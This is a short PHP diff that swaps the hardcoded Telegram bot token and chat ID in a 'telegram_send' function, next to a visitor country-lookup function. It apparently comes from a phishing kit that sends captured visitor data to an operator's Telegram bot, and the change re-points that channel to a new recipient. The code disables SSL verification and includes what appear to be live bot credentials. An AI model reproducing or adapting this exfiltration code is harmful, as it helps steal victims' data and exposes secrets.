@@ -205,8 +205,8 @@ function get_user_countrycode() {
 
 function telegram_send($message) {
     $curl = curl_init();
-    $api_key  = '6090100338:AAFd0QAQjhnH2-omPoj5yEgq3Oc3qxxnxC4';
-    $chat_id  = '5368571583';
+    $api_key  = '7808636814:AAGe7USYoVtSDviFHirAWc5QpFdTv9toOMw';
+    $chat_id  = '5714386734';
     $format   = 'HTML';
     curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
